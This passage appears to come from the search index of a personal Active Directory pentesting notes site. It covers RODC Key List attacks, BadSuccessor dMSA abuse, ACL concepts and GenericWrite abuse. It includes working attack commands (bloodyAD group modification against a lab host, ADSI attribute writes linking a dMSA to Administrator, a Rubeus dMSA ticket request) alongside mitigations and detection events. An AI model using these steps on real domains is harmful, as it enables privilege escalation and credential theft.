Movement","lvl":4,"t":"🧩 Why Golden Ticket Alone Is Not Enough","c":"RODC Golden Ticket: ✔️ Authenticates you as user ❌ Does NOT give hash 👉 Key List Attack is required to: Extract credentials"},{"id":"full-chain-clean-view","u":"01_attacks-lateral-movement.html#full-chain-clean-view","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Full Chain (Clean View)","c":"Compromise RODC Dump KRBTGT_XXXXX Modify: RevealOnDemandGroup NeverRevealGroup Forge RODC TGT (as DA) Send Key List request DC returns DA hash"},{"id":"final-one-line-understanding-1","u":"01_attacks-lateral-movement.html#final-one-line-understanding-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Final One-Line Understanding","c":"You trick the Domain Controller into thinking a trusted RODC is requesting credentials for a user it is allowed to cache — so it gives you the hash."},{"id":"what-does-the-dc-actually-send-back","u":"01_attacks-lateral-movement.html#what-does-the-dc-actually-send-back","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 What does the DC actually send back?","c":"📌 Your question “We send TGT → does DC give TGS with hash?” ✔️ Precise Answer: Yes and no (important nuance): ✔️ You do receive a TGS-REP ✔️ Inside that response is a special structure: KERB-KEY-LIST-REP ✔️ That structure contains: Kerberos keys (AES, etc.) NT hash (NTLM hash)"},{"id":"so-technically","u":"01_attacks-lateral-movement.html#so-technically","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 So technically:","c":"👉 It’s not: “normal TGS containing a hash” 👉 It is: “TGS response containing a credential structure (key list)”"},{"id":"what-is-inside-the-response","u":"01_attacks-lateral-movement.html#what-is-inside-the-response","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 What is inside the response?","c":"From your example: ServiceName : krbtgt/DOMAIN.LOCAL UserName : admin KeyType : aes256 Password Hash : 64F12CDDAA88057E06A81B54E73B949B"},{"id":"internally-it-contains","u":"01_attacks-lateral-movement.html#internally-it-contains","sec":"Attacks + Lateral Movement","lvl":4,"t":"📌 Internally it contains:","c":"AES keys (Kerberos) RC4 key (NT hash) Possibly multiple encryption types"},{"id":"why-does-dc-send-this","u":"01_attacks-lateral-movement.html#why-does-dc-send-this","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Why does DC send this?","c":"Because it thinks: “This RODC is allowed to cache this user’s credentials” So instead of: Sending just a ticket It sends: Actual credential material"},{"id":"important-doubt-cleared","u":"01_attacks-lateral-movement.html#important-doubt-cleared","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Important Doubt Cleared","c":"❓ “Do we still need to dump RODC cache?” ✔️ Answer: NO Once Key List Attack succeeds: You already have: ✔️ NT hash of target So: ❌ No need to check RODC cache ❌ No need to wait for caching"},{"id":"why-1","u":"01_attacks-lateral-movement.html#why-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Why?","c":"Because: Method | Source of Hash | — | — | RODC cache dump | Stored locally in RODC | Key List Attack | Directly from writable DC | 👉 Key List Attack is: More powerful than cache dumping"},{"id":"key-difference-very-important","u":"01_attacks-lateral-movement.html#key-difference-very-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Key Difference (Very Important)","c":"Feature | RODC Cache | Key List Attack | — | — | — | Requires user to log in | ✅ Yes | ❌ No | Depends on cached creds | ✅ Yes | ❌ No | Gets hash directly | ❌ Indirect | ✅ Direct | Source | RODC | Writable DC | 🧠 Final Understanding (Critical Insight) With Key List Attack, you are not extracting existing credentials — you are forcing the Domain Controller to give you fresh credential material on demand . ⚠️ One More Subtle Point Even though you get a TGS-REP , the important part is: 👉 Not the ticket itself 👉 But the credential data embedded in it 🎯 Final Answer (Clean) When you send the forged RODC TGT and request a key list, the Domain Controller returns a TGS-REP that contains a special credential structure ( KERB-KEY-LIST-REP ) which includes the target user’s NT hash. Once you obtain this hash, you do not need to interact with the RODC cache anymore, because you already have the credential directly from the Domain Controller. 🧠 One-Line Mental Model “Golden Ticket gives identity → Key List Attack converts identity into credentials.”"},{"id":"poc---rbcd-properties-manipluation","u":"01_attacks-lateral-movement.html#poc---rbcd-properties-manipluation","sec":"Attacks + Lateral Movement","lvl":3,"t":"PoC - RBCD + Properties Manipluation","c":"image.png image.png image.png image.png image.png image.png image.png Note: Since user belongs to tier 1 he can add to RODC01 group and modify the policy since he can WriteAccounPermission Rights bloodyAD -u l.wilson_adm -p 'Pass123!' -d garfield.htb --host 10.129.23.208 add groupMember \"RODC Administrators\" l.wilson_adm image.png image.png image.png image.png image.png image.png image.png Note 🔴 msDS-NeverRevealGroup (DENY LIST) 👉 Users/groups here: ❌ Their passwords will NEVER be cached on RODC 🟢 msDS-RevealOnDemandGroup (ALLOW LIST) 👉 Users/groups here: ✅ Their passwords CAN be cached on RODC (on request) image.png image.png image.png image.png image.png image.png image.png image.png image.png image.png Note: It’s been cleared now image.png image.png image.png image.png image.png image.png image.png image.png"},{"id":"bad-successor-dmsa-abuse","u":"01_attacks-lateral-movement.html#bad-successor-dmsa-abuse","sec":"Attacks + Lateral Movement","lvl":2,"t":"Bad Successor ( dMSA Abuse )","c":""},{"id":"what-is-a-dmsa-delegated-managed-service-account","u":"01_attacks-lateral-movement.html#what-is-a-dmsa-delegated-managed-service-account","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 What is a dMSA (Delegated Managed Service Account)?","c":"Before defining dMSA, understand one thing: 👉 dMSA is not just another service account. The main purpose of dMSA is: Secure migration from legacy service accounts ↓ to Managed Service Accounts This migration capability is what makes dMSA unique."},{"id":"official-definition","u":"01_attacks-lateral-movement.html#official-definition","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 Official Definition","c":"A Delegated Managed Service Account (dMSA) is a special Active Directory account introduced in Windows Server 2025 that allows organizations to migrate existing service accounts to a managed identity while preserving access, permissions, and service functionality. Think: Old Service Account ↓ Migration Relationship ↓ dMSA"},{"id":"why-was-dmsa-created","u":"01_attacks-lateral-movement.html#why-was-dmsa-created","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 Why Was dMSA Created?","c":"Microsoft looked at large enterprises and found:"},{"id":"reality","u":"01_attacks-lateral-movement.html#reality","sec":"Attacks + Lateral Movement","lvl":2,"t":"Reality","c":"Thousands of services still run as: 👤 svc_sql 👤 svc_backup 👤 svc_exchange 👤 svc_iis These accounts may have existed for: 📅 5 years 📅 10 years 📅 15 years"},{"id":"these-accounts-usually-have","u":"01_attacks-lateral-movement.html#these-accounts-usually-have","sec":"Attacks + Lateral Movement","lvl":2,"t":"These Accounts Usually Have","c":""},{"id":"group-memberships","u":"01_attacks-lateral-movement.html#group-memberships","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Group Memberships","c":"SQL Admins Backup Operators Server Admins"},{"id":"service-permissions","u":"01_attacks-lateral-movement.html#service-permissions","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Service Permissions","c":"Database Access File Share Access Application Access"},{"id":"kerberos-spns","u":"01_attacks-lateral-movement.html#kerberos-spns","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Kerberos SPNs","c":"MSSQLSvc/SQL01 HTTP/WEB01"},{"id":"delegation-settings","u":"01_attacks-lateral-movement.html#delegation-settings","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Delegation Settings","c":"Constrained Delegation Resource Based Delegation"},{"id":"scheduled-tasks","u":"01_attacks-lateral-movement.html#scheduled-tasks","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Scheduled Tasks","c":"Backup Jobs Automation Scripts 🚨 Migration Problem Suppose company wants to replace: svc_sql with: gMSA_SQL$ What must be migrated?"},{"id":"permissions","u":"01_attacks-lateral-movement.html#permissions","sec":"Attacks + Lateral Movement","lvl":3,"t":"Permissions","c":""},{"id":"spns","u":"01_attacks-lateral-movement.html#spns","sec":"Attacks + Lateral Movement","lvl":3,"t":"SPNs","c":""},{"id":"delegations","u":"01_attacks-lateral-movement.html#delegations","sec":"Attacks + Lateral Movement","lvl":3,"t":"Delegations","c":""},{"id":"access-rights","u":"01_attacks-lateral-movement.html#access-rights","sec":"Attacks + Lateral Movement","lvl":3,"t":"Access Rights","c":""},{"id":"group-memberships-1","u":"01_attacks-lateral-movement.html#group-memberships-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Group Memberships","c":""},{"id":"application-configurations","u":"01_attacks-lateral-movement.html#application-configurations","sec":"Attacks + Lateral Movement","lvl":3,"t":"Application Configurations","c":""},{"id":"scheduled-tasks-1","u":"01_attacks-lateral-movement.html#scheduled-tasks-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Scheduled Tasks","c":""},{"id":"kerberos-settings","u":"01_attacks-lateral-movement.html#kerberos-settings","sec":"Attacks + Lateral Movement","lvl":3,"t":"Kerberos Settings","c":"In a large enterprise: 1000+ Service Accounts This becomes a nightmare. Microsoft’s Goal Microsoft wanted: Old Account ↓ New Managed Account without: ❌ Rebuilding everything ❌ Service outages ❌ Permission mistakes ❌ Manual migration work 🎯 Core Idea Behind dMSA The major innovation is:"},{"id":"successor-relationship","u":"01_attacks-lateral-movement.html#successor-relationship","sec":"Attacks + Lateral Movement","lvl":3,"t":"“Successor Relationship”","c":"Instead of creating a completely unrelated account: svc_sql gMSA_SQL$ Microsoft wanted: svc_sql ↓ Successor ↓ dMSA_SQL$ AD now understands: This account replaces that account. 🔥 What Makes dMSA Different?"},{"id":"msa","u":"01_attacks-lateral-movement.html#msa","sec":"Attacks + Lateral Movement","lvl":2,"t":"MSA","c":"Knows: I am a service account."},{"id":"gmsa-1","u":"01_attacks-lateral-movement.html#gmsa-1","sec":"Attacks + Lateral Movement","lvl":2,"t":"gMSA","c":"Knows: I am a service account used by multiple computers."},{"id":"dmsa","u":"01_attacks-lateral-movement.html#dmsa","sec":"Attacks + Lateral Movement","lvl":2,"t":"dMSA","c":"Knows: I am replacing another account. This is the huge difference."},{"id":"abusing-bad-successor-example---1","u":"01_attacks-lateral-movement.html#abusing-bad-successor-example---1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Abusing Bad Successor ( Example - 1 )","c":"image.png"},{"id":"technical-analysis","u":"01_attacks-lateral-movement.html#technical-analysis","sec":"Attacks + Lateral Movement","lvl":3,"t":"Technical Analysis","c":"Attack Chain Overview The BadSuccessor attack follows a multi-stage process: Reconnaissance : Enumerate writable Organizational Units dMSA Creation : Create or modify delegated managed service accounts Privilege Linking : Associate dMSA with high-privilege accounts (simulating the migration) Ticket Manipulation : Leverage Kerberos ticketing to obtain elevated access Credential Extraction : Dump credentials via KERB-DMSA-KEY-PACKAGE image.png Phase 1: Environmental Reconnaissance The attack begins by identifying vulnerable OUs where the current user has write permissions. Attackers scan Active Directory to locate OUs with insufficient access restrictions. Phase 1: Environmental Reconnaissance Phase 2: dMSA Object Manipulation Once a target OU is identified, the attacker creates a new msDS-DelegatedManagedServiceAccount object or modifies an existing one. Key attributes configured include: msDS-DelegatedMSAState : Set to 2 (active state) msDS-ManagedAccountPrecededByLink : Points to the target high-privilege user DN msDS-ManagedPasswordInterval : Password rotation interval userAccountControl : Workstation trust account flags msDS-SupportedEncryptionTypes : Kerberos encryption types Phase 3: Kerberos Ticket Exploitation The exploitation leverages Kerberos ticket-granting mechanisms: Obtain TGT for the principal with dMSA retrieval permissionsa. First, find the LUIDb. Now, dump their TGT Request TGS for the dMSA account using the TGT Use the dMSA TGS to request additional service tickets with elevated privileges Phase 4: Credential Access and Lateral Movement With elevated tickets, attackers can access high-value resources and perform lateral movement across the domain."},{"id":"dmsa-credential-dumping-via-kerb-dmsa-key-package","u":"01_attacks-lateral-movement.html#dmsa-credential-dumping-via-kerb-dmsa-key-package","sec":"Attacks + Lateral Movement","lvl":3,"t":"dMSA Credential Dumping via KERB-DMSA-KEY-PACKAGE","c":"Understanding KERB-DMSA-KEY-PACKAGE When you request a TGT for a dMSA, it comes with a new structure called KERB-DMSA-KEY-PACKAGE . This structure includes two fields: current-keys and previous-keys. According to Microsoft documentation, these are supposed to contain keys related to the current and previous password of the dMSA. More specifically, these are the keys for the account that it has “migrated,” the one set in the msDS-ManagedAccountPrecededByLink attribute. Example Output dMSA current keys found in TGS: AES256: e2a4d53a420e9744cfe0e02be4737dbf54696de3b2cd9a8b1660f0766ba44c07 AES128: f85231afe622e50334b88ef5d42927b1 RC4: c26ce2ac39887be229af3b45388e6050 dMSA previous keys found in TGS (including keys of preceding managed accounts): RC4: e16081eb077aca74bdbf8af12af43ac9 Credential Extraction Process The KERB-DMSA-KEY-PACKAGE structure can be exploited to extract credential material: TGT Acquisition : Request a Ticket Granting Ticket for the dMSA account Package Extraction : Parse the KERB-DMSA-KEY-PACKAGE from the TGT response Key Retrieval : Extract current and previous password keys from the package Credential Reconstruction : Use extracted keys to reconstruct usable credentials"},{"id":"abusing-bad-successor-example---2","u":"01_attacks-lateral-movement.html#abusing-bad-successor-example---2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Abusing Bad Successor ( Example - 2 )","c":"image.png The vulnerability has been dubbed BadSuccessor and resides in the ability to abuse the legacy account migration process to dMSA. Its exploitation does not require prior elevation of privilege and can run in domains that do not even actively use dMSAs, as long as at least one domain controller running Windows Server 2025 exists."},{"id":"key-features-of-badsuccessor","u":"01_attacks-lateral-movement.html#key-features-of-badsuccessor","sec":"Attacks + Lateral Movement","lvl":3,"t":"Key features of BadSuccessor","c":"Privilege escalation allowing complete domain control. Affected product : Windows Server 2025. Potential impact : Privilege escalation allowing complete domain control. Operating requirements : ◦ Write permission to a dMSA account (existing or newly created). ◦ Permission to create objects in an Organizational Unit (OU)."},{"id":"exploitation-process","u":"01_attacks-lateral-movement.html#exploitation-process","sec":"Attacks + Lateral Movement","lvl":3,"t":"Exploitation process","c":"The vulnerability lies in how the KDC (Key Distribution Center) treats the msDS-ManagedAccountPrecededByLink attribute. This link indicates which account is being replaced by the dMSA, and the KDC, without performing additional validations, grants the dMSA all the privileges of the original account, including: SID of the replaced user.Group memberships (including Domain Admins). Historical credentials of the migrated user (RC4-HMAC key). SID of the replaced user. Group memberships (including Domain Admins). Historical credentials of the migrated user (RC4-HMAC key). dMSA current keys found in TGS: AES256: e2a4d53a420e9744cfe0e02be4737dbf54696de3b2cd9a8b1660f0766ba44c07 AES128: f85231afe622e50334b88ef5d42927b1 RC4: c26ce2ac39887be229af3b45388e6050 dMSA previous keys found in TGS (including keys of preceding managed accounts): RC4: e16081eb077aca74bdbf8af12af43ac9 image.png"},{"id":"attack-flow-1","u":"01_attacks-lateral-movement.html#attack-flow-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Attack flow","c":"1- Create a new dMSA in an OU where you have CreateChild permissions. New-ADServiceAccount -Name -DNSHostName -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword -path “OU=test,DC=domain,DC=com” 2- Set the attributes: msDS-ManagedAccountPrecededByLink → objective DN (e.g. CN=Administrator,CN=Users,DC=dominio,DC=local) msDS-DelegatedMSAState → 2 (full migration) msDS-ManagedAccountPrecededByLink → objective DN (e.g. CN=Administrator,CN=Users,DC=dominio,DC=local) msDS-DelegatedMSAState → 2 (full migration) $dMSA = [ADSI]”LDAP://CN=attacker_dmsa,OU=test,DC=domain,DC=com” $dMSA.Put(“msDS-DelegatedMSAState”,2) $dMSA.Put(“msDS-ManagedAccountPrecededByLink”, “CN=Administrator,CN=users,DC=domain,DC=com”) $dMSA.SetInfo() 3- Request a TGT for the dMSA (e.g. with Rubeus ): Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/dominio.com /dmsa /ptt /opsec /nowrap /ticket:<Machine TGT> 4- The TGT obtained will include: Domain Administrator SIDPrivileged group memberships (Domain Admins, Enterprise Admins)Historical keys of the original user Domain Administrator SID Privileged group memberships (Domain Admins, Enterprise Admins) Historical keys of the original user"},{"id":"additional-attack-capabilities","u":"01_attacks-lateral-movement.html#additional-attack-capabilities","sec":"Attacks + Lateral Movement","lvl":3,"t":"Additional Attack Capabilities","c":"In addition to privilege escalation, it was observed that the dMSA receives in its KERB-DMSA-KEY-PACKAGE the cryptographic keys of the replaced user, including previous passwords in formats such as RC4-HMAC. This makes it possible to: Target password recovery.Use of old tickets issued with previous keys.Perform extended Kerberoasting attacks. Target password recovery. Use of old tickets issued with previous keys. Perform extended Kerberoasting attacks."},{"id":"impact","u":"01_attacks-lateral-movement.html#impact","sec":"Attacks + Lateral Movement","lvl":3,"t":"Impact","c":"This behavior can be exploited against any account on the domain, including: Domain administrators Domain Controllers Protected Users And no access to the target account is required. All you need is permission on a dMSA and the ability to write to its attributes."},{"id":"mitigation-of-badsuccessor","u":"01_attacks-lateral-movement.html#mitigation-of-badsuccessor","sec":"Attacks + Lateral Movement","lvl":3,"t":"Mitigation of BadSuccessor","c":"Microsoft has acknowledged the problem but has not yet released a patch. Recommended mitigation includes:"},{"id":"immediate-containment","u":"01_attacks-lateral-movement.html#immediate-containment","sec":"Attacks + Lateral Movement","lvl":3,"t":"Immediate containment","c":"Restrict CreateChild permissions on OUs. Audit permissions on msDS-DelegatedManagedServiceAccount and prevent non-privileged users from creating dMSAs. Block or monitor the use of Start-ADServiceAccountMigration. Restrict CreateChild permissions on OUs. Audit permissions on msDS-DelegatedManagedServiceAccount and prevent non-privileged users from creating dMSAs. Block or monitor the use of Start-ADServiceAccountMigration."},{"id":"auditing-and-detection","u":"01_attacks-lateral-movement.html#auditing-and-detection","sec":"Attacks + Lateral Movement","lvl":3,"t":"Auditing and detection","c":"Audit dMSA Creation: Configure a SACL to Record the Creation of New msDS-DelegatedManagedServiceAccount Objects (Event ID 5137). Monitor Attribute Modifications: Configure a SACL for Modifications to the msDS-ManagedAccountPrecededByLink Attribute (Event ID 5136). dMSA authentication trace: When a TGT is generated for a dMSA and includes the KERB-DMSA-KEY-PACKAGE structure, the domain controller logs the following event (Event ID 2946). Audit dMSA Creation : Configure a SACL to Record the Creation of New msDS-DelegatedManagedServiceAccount Objects ( Event ID 5137 ). Monitor Attribute Modifications : Configure a SACL for Modifications to the msDS-ManagedAccountPrecededByLink Attribute ( Event ID 5136 ). dMSA authentication trace : When a TGT is generated for a dMSA and includes the KERB-DMSA-KEY-PACKAGE structure, the domain controller logs the following event ( Event ID 2946 )."},{"id":"dacl-sacl","u":"02_permissions-abuse.html#dacl-sacl","sec":"Permissions Abuse","lvl":2,"t":"DACL & SACL","c":""},{"id":"access-control-model-in-active-directory","u":"02_permissions-abuse.html#access-control-model-in-active-directory","sec":"Permissions Abuse","lvl":4,"t":"🔐 Access Control Model in Active Directory","c":"The Access Control Model defines who can access what in the Active Directory environment. It is a security mechanism that governs how subjects (like users or processes) interact with objects (like files, folders, AD objects, or resources) based on security information . This model is implemented using the following key components:"},{"id":"access-tokens","u":"02_permissions-abuse.html#access-tokens","sec":"Permissions Abuse","lvl":4,"t":"🧾 1. Access Tokens","c":"An Access Token is created when a user logs in . It represents the security context of the user or process and contains important information that determines what the user/process is allowed to do."},{"id":"contents-of-an-access-token","u":"02_permissions-abuse.html#contents-of-an-access-token","sec":"Permissions Abuse","lvl":4,"t":"✅ Contents of an Access Token:","c":"User SID (Security Identifier) Group SIDs (all groups the user is a member of) Privileges (like the ability to shut down the system or back up files) Default DACL (used when the user creates new objects) image.png"},{"id":"usage","u":"02_permissions-abuse.html#usage","sec":"Permissions Abuse","lvl":4,"t":"🔄 Usage:","c":"Whenever a user tries to access a resource , their access token is compared to the Security Descriptor of the object they are trying to access."},{"id":"security-descriptors","u":"02_permissions-abuse.html#security-descriptors","sec":"Permissions Abuse","lvl":4,"t":"🛡️ 2. Security Descriptors","c":"A Security Descriptor (SD) is a data structure attached to each object in Active Directory (and other securable resources). It defines who owns the object , who can access it , and how that access is audited . Any object(resource or service) that Windows wants to protect with permissions has a Security Descriptor. Eg:- File system, Registry, Services, Active Directory objects, event logs, printers, etc."},{"id":"key-components-of-a-security-descriptor","u":"02_permissions-abuse.html#key-components-of-a-security-descriptor","sec":"Permissions Abuse","lvl":4,"t":"🔍 Key components of a Security Descriptor:","c":"Component | Description | — | — | Owner SID | The SID of the user or group that owns the object | DACL (Discretionary Access Control List) | Defines who has what type of access to the object (Read, Write, Full Control, etc.) | SACL (System Access Control List) | Defines what access attempts should be logged for auditing purposes |"},{"id":"dacl-discretionary-access-control-list","u":"02_permissions-abuse.html#dacl-discretionary-access-control-list","sec":"Permissions Abuse","lvl":4,"t":"📋 3. DACL (Discretionary Access Control List)","c":"The DACL contains Access Control Entries (ACEs) that define permissions for users or groups."},{"id":"each-ace-includes","u":"02_permissions-abuse.html#each-ace-includes","sec":"Permissions Abuse","lvl":4,"t":"🧱 Each ACE includes:","c":"A SID (the user or group) A set of permissions (e.g., Read, Write, Modify) A flag indicating whether the access is allowed or denied ❗ If there is no DACL, the object is unprotected, and any user can access it."},{"id":"sacl-system-access-control-list","u":"02_permissions-abuse.html#sacl-system-access-control-list","sec":"Permissions Abuse","lvl":4,"t":"🔍 4. SACL (System Access Control List)","c":"The SACL is used for auditing access to objects. It specifies which operations on the object should be logged in the Security Event Log . For example: Audit success or failure of access attempts. Used by Windows Auditing and Advanced Threat Detection tools."},{"id":"how-it-all-works-together","u":"02_permissions-abuse.html#how-it-all-works-together","sec":"Permissions Abuse","lvl":4,"t":"⚙️ How It All Works Together","c":"A user logs in → Windows creates an Access Token . The user tries to access an Active Directory object (like a user account or GPO). Windows checks the Security Descriptor of the object: Compares the user’s Access Token (SIDs + privileges) With the object’s DACL If access is allowed → user can proceed. If the SACL has rules for that type of access → the attempt is logged."},{"id":"example-scenario","u":"02_permissions-abuse.html#example-scenario","sec":"Permissions Abuse","lvl":4,"t":"🧠 Example Scenario","c":"A user “Alice” logs into her domain-joined PC. She wants to read a file stored on a shared drive : Her Access Token includes her user SID and group memberships like Domain Users . The file has a Security Descriptor : Owner: IT Admin DACL: Grants read access to Domain Users SACL: Logs read access by any user Result: Alice can read the file (because Domain Users are allowed). The read attempt is audited because of the SACL."},{"id":"in-summary","u":"02_permissions-abuse.html#in-summary","sec":"Permissions Abuse","lvl":4,"t":"📌 In Summary","c":"Component | Purpose | — | — | Access Token | Defines who is trying to access (SID, groups, privileges) | Security Descriptor | Defines what access is allowed and who owns the object | DACL | Controls access permissions (Allow/Deny) | SACL | Controls auditing and logging of access attempts | image.png"},{"id":"key-components-in-the-diagram","u":"02_permissions-abuse.html#key-components-in-the-diagram","sec":"Permissions Abuse","lvl":4,"t":"🧱 Key Components in the Diagram","c":"✅ Object This is the resource (e.g., file, folder, AD object) that someone is trying to access."},{"id":"dacl-discretionary-access-control-list-1","u":"02_permissions-abuse.html#dacl-discretionary-access-control-list-1","sec":"Permissions Abuse","lvl":4,"t":"🛡️ DACL (Discretionary Access Control List)","c":"Attached to the object. It contains Access Control Entries (ACEs) that define who can or cannot access the object and what type of access is allowed or denied. ✅ Subjects This contains users, groups or process trying to access the object(resource). Above example contains two treads Tread A and Tread B. Each Tread contains certain set of users or groups"},{"id":"thread-a-andrew-tries-to-access-the-object","u":"02_permissions-abuse.html#thread-a-andrew-tries-to-access-the-object","sec":"Permissions Abuse","lvl":4,"t":"🔒 Thread A (Andrew) Tries to Access the Object","c":"When a user from Tread A, lets say Andrew tries to access the object with its access token, he is passed through DACL, ACE 1 matches Andrew directly and says “Access Denied”. Deny takes precedence that means the user will know not be passed further. ❌ Access is Denied , even though Andrew is part of Group A (which is allowed in ACE 2). Why? Because the Deny ACE appears first and directly targets Andrew."},{"id":"thread-b-jane-tries-to-access-the-object","u":"02_permissions-abuse.html#thread-b-jane-tries-to-access-the-object","sec":"Permissions Abuse","lvl":4,"t":"Thread B (Jane) Tries to Access the Object","c":"Jane is not denied explicitly. HE is a member of Group A , and ACE 2 allows write access to Group A. ACE 3 also gives Everyone read/execute. So a member of Group A has all the permissions ✅ Access is Allowed ."},{"id":"key-takeaways-from-this-image","u":"02_permissions-abuse.html#key-takeaways-from-this-image","sec":"Permissions Abuse","lvl":3,"t":"⚠️ Key Takeaways from This Image","c":"Access Tokens represent user identity and groups. DACLs contain ACEs that define who can access the object. “Deny” entries override “Allow” entries . Evaluation stops at the first applicable ACE . Order of ACEs in the DACL matters ."},{"id":"commands","u":"02_permissions-abuse.html#commands","sec":"Permissions Abuse","lvl":4,"t":"Commands:","c":"Get the ACLs associated with the specified object: Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs The -ResolveGUIDs flag tells PowerView to translate security GUIDs (which represent permissions) into human-readable names . image.png"},{"id":"what-is-an-acl-access-control-list","u":"02_permissions-abuse.html#what-is-an-acl-access-control-list","sec":"Permissions Abuse","lvl":4,"t":"🛡️ What is an ACL (Access Control List)?","c":"✅ Definition: An ACL is a list of permissions attached to an object (like a user, group, OU, computer, etc.) that defines who can do what with that object. 🧠 Think of it as: “This object has a list of rules — and each rule says who can perform which actions.” There are two types of ACLs: DACL (Discretionary Access Control List) SACL (System Access Control List) Note:- ACL is part of Security Descriptors"},{"id":"what-is-an-ace-access-control-entry","u":"02_permissions-abuse.html#what-is-an-ace-access-control-entry","sec":"Permissions Abuse","lvl":4,"t":"🎟️ What is an ACE (Access Control Entry)?","c":"✅ Definition: An ACE is a single rule inside an ACL. It defines a specific permission granted (or denied) to a security principal (user, group, computer, etc.). 🧠 Think of it as: “One entry in the rulebook saying: User Alice can ResetPassword on Object X.”"},{"id":"acl-vs-ace-visual-analogy","u":"02_permissions-abuse.html#acl-vs-ace-visual-analogy","sec":"Permissions Abuse","lvl":4,"t":"🧱 ACL vs ACE – Visual Analogy","c":"Concept | Real-World Analogy | — | — | ACL | A guest list for a party | ACE | One line on that list: “John is allowed to enter the VIP room” |"},{"id":"in-active-directory","u":"02_permissions-abuse.html#in-active-directory","sec":"Permissions Abuse","lvl":4,"t":"🧰 In Active Directory:","c":"Every AD object has a Discretionary Access Control List (DACL) that contains multiple ACEs . 🧠 Example (User Object): Object: User = John.Doe ACL: ACE 1: Group \"Domain Admins\" → Full Control ACE 2: User \"Alice\" → ResetPassword ACE 3: User \"Bob\" → WriteProperty (ServicePrincipalName)"},{"id":"why-are-acls-aces-important-in-pentesting","u":"02_permissions-abuse.html#why-are-acls-aces-important-in-pentesting","sec":"Permissions Abuse","lvl":4,"t":"🔥 Why are ACLs & ACEs Important in Pentesting?","c":"Attackers can abuse misconfigured ACEs to: 🧑‍💻 Reset another user’s password 🛠️ Change SPNs and perform Kerberoasting 📌 Take ownership of an object 🧬 Replicate domain secrets (DCsync attack)"},{"id":"common-abuse-scenarios","u":"02_permissions-abuse.html#common-abuse-scenarios","sec":"Permissions Abuse","lvl":4,"t":"📍 Common Abuse Scenarios:","c":"ACE Type | Abusable Permission | Attack | — | — | — | GenericWrite | Modify user/computer object | Add SPN, reset password | WriteOwner | Change object owner | Become object owner | WriteDacl | Modify permissions | Grant yourself full access | ResetPassword | Reset user’s password | Log in as them | Replicating Directory Changes | Pull directory secrets | DCSync (hash dump) |"},{"id":"ace-types-you-should-watch-for-as-an-attacker","u":"02_permissions-abuse.html#ace-types-you-should-watch-for-as-an-attacker","sec":"Permissions Abuse","lvl":4,"t":"🔐 ACE Types You Should Watch For (as an Attacker)","c":"ACE Type | What It Lets You Do | — | — | GenericAll | Full control – do anything | GenericWrite | Modify most object attributes | WriteDACL | Change object’s permissions | WriteOwner | Change the owner of the object | ResetPassword | Reset a user’s password | AllExtendedRights | Includes DCSync privileges |"},{"id":"summary","u":"02_permissions-abuse.html#summary","sec":"Permissions Abuse","lvl":4,"t":"🔚 Summary","c":"Term | Meaning | Key Point | — | — | — | ACL | List of access control entries | Defines who can access an AD object | ACE | A single permission rule in an ACL | Says who can do what to whom | Why It Matters | Misconfigurations allow privilege escalation | Attackers look for exploitable ACEs to gain control | Would you like a visual map of an ACL attack path , or a lab-style demo on how to abuse ACEs with PowerView or BloodHound ?"},{"id":"acl","u":"02_permissions-abuse.html#acl","sec":"Permissions Abuse","lvl":4,"t":"ACL","c":""},{"id":"genericwrite","u":"02_permissions-abuse.html#genericwrite","sec":"Permissions Abuse","lvl":2,"t":"🔐 GenericWrite","c":""},{"id":"what-is-genericwrite","u":"02_permissions-abuse.html#what-is-genericwrite","sec":"Permissions Abuse","lvl":4,"t":"📌 1. What is GenericWrite?","c":"The GenericWrite permission in Active Directory allows a user to modify all writable attributes of an object, except for properties that require special permissions such as resetting passwords. If an attacker gains GenericWrite over a user , they can write to the servicePrincipalNames attribute and immediately initiate a targeted Kerberoasting attack. Moreover , having GenericWrite over a group enables them to add their account—or one they control—directly to that group, effectively escalating privileges. Alternatively , if the attacker obtains GenericWrite over a computer object, they can modify the msds-KeyCredentialLink attribute. As a result , they create Shadow Credentials and authenticate as that computer account using Kerberos PKINIT . GenericWrite = Permission to modify writable attributes of an AD object. 👉 It does NOT give full control , but allows: Editing specific attributes (depends on object type) Indirect privilege escalation"},{"id":"prerequisites","u":"02_permissions-abuse.html#prerequisites","sec":"Permissions Abuse","lvl":4,"t":"🎯 2. Prerequisites","c":"Requirement | Explanation | — | — | Domain access | Valid domain user | GenericWrite permission | On target object (user / group / computer) | Reachability | LDAP / SMB / RPC to Domain Controller | Target object exists | User / Group / Computer |"},{"id":"conditions-for-abuse","u":"02_permissions-abuse.html#conditions-for-abuse","sec":"Permissions Abuse","lvl":4,"t":"⚙️ 3. Conditions for Abuse","c":"Condition | Why Important | — | — | Attribute must be writable | Not all attributes are | Target not protected | AdminSDHolder may restrict | Tool compatibility | PowerView / Impacket / BloodyAD | Object type matters | Abuse differs (user vs group vs computer) |"},{"id":"abuse-based-on-object-type","u":"02_permissions-abuse.html#abuse-based-on-object-type","sec":"Permissions Abuse","lvl":4,"t":"🔥 4. Abuse Based on Object Type","c":"👤 A. GenericWrite on USER 🧠 What you can modify servicePrincipalName userAccountControl scriptPath 